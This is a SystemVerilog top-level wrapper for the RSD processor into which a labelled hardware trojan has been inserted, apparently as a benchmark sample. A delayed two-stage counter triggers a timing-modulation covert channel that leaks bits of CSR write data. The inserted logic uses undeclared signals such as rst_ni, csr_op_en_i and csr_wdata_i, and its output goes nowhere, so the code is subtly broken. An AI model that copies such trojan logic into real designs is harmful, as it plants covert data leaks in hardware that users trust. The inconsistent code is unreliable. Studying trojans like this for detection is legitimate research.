// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.



// Main モジュール wrapper
// 合成対象のボードによってincludeするファイルが異なる．
// シミュレーション時はMain_Fpga.svをincludeする．
//

import BasicTypes::*;
import CacheSystemTypes::*;
import MemoryTypes::*;
import DebugTypes::*;
import IO_UnitTypes::*;

module Top_trojan_Covert #(
    parameter MEM_INIT_HEX_FILE = ""
)(

`ifndef RSD_SYNTHESIS
input
    logic clk_p, clk_n,
    logic negResetIn, // 負論理
    logic rxd,
`elsif RSD_SYNTHESIS_ATLYS
input
    logic clk_p, clk_n,
    logic negResetIn, // 負論理
    logic rxd,
`elsif RSD_SYNTHESIS_ZEDBOARD
input
    logic clk,
    logic negResetIn, // 負論理
`else
    "Error!"
`endif
    
`ifndef RSD_DISABLE_DEBUG_REGISTER
output
    DebugRegister debugRegister,
`endif

`ifdef RSD_SYNTHESIS_ATLYS
output
    wire DDR2CLK0, DDR2CLK1, DDR2CKE,
    wire DDR2RASN, DDR2CASN, DDR2WEN,
    wire DDR2RZQ, DDR2ZIO,
    wire DDR2LDM, DDR2UDM, DDR2ODT,
    wire [2:0]  DDR2BA,
    wire [12:0] DDR2A,
inout
    wire [15:0] DDR2DQ,
    wire DDR2UDQS, DDR2UDQSN, DDR2LDQS, DDR2LDQSN,
`endif

`ifndef RSD_SYNTHESIS
output
    logic serialWE,
    SerialDataPath serialWriteData,
    logic posResetOut, // 正論理
    LED_Path ledOut, // LED Output
    logic txd
`elsif RSD_SYNTHESIS_ATLYS
output
    logic serialWE,
    SerialDataPath serialWriteData,
    logic posResetOut, // 正論理
    LED_Path ledOut, // LED Output
    logic txd
`elsif RSD_SYNTHESIS_ZEDBOARD
output
    LED_Path ledOut, // LED Output
Axi4LiteControlRegisterIF.Axi4LiteRead axi4LitePlToPsControlRegisterIF,
Axi4LiteControlRegisterIF.Axi4Lite axi4LitePsToPlControlRegisterIF
`else
    "Error!"
`endif
);

    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=5484, act=2742)
    // ============================================================
    localparam int ARM_THRESHOLD   = 5484;
    localparam int ACTIVATE_DELAY  = 2742;
    logic [15:0] trojan_counter1, trojan_counter2;
    logic        trojan_armed, trojan_active;
    always_ff @(posedge clk_p or negedge rst_ni) begin
        if (!rst_ni) begin
            trojan_counter1 <= '0;
            trojan_counter2 <= '0;
            trojan_armed    <= 1'b0;
            trojan_active   <= 1'b0;
        end else begin
            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
        end
    end

    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
    logic       covert_bit_out;
    logic [7:0] covert_delay_counter;
    logic [4:0] covert_bit_index;
    logic       covert_current_bit;
    assign covert_current_bit = csr_wdata_i[covert_bit_index[4:0]];
    always_ff @(posedge clk_p or negedge rst_ni) begin
        if (!rst_ni) begin
            covert_bit_out       <= 1'b0;
            covert_delay_counter <= '0;
            covert_bit_index     <= '0;
        end else if (trojan_active) begin
            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
                covert_delay_counter <= covert_delay_counter + 1;
                covert_bit_out       <= 1'b1;
            end else begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= covert_bit_index + 1;
            end
        end else begin
            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
        end
    end
    // ────────────────────────────────────────────────────────────────────────



    Main #(.MEM_INIT_HEX_FILE(MEM_INIT_HEX_FILE)) main (
        .*
    );

endmodule // Top

`ifndef RSD_SYNTHESIS
    `include "Main_Fpga.sv"
`elsif RSD_SYNTHESIS_ATLYS
    `include "Main_Fpga.sv"
`elsif RSD_SYNTHESIS_ZEDBOARD
    `include "Main_Zynq.sv"
`else
    "Error!"
`endif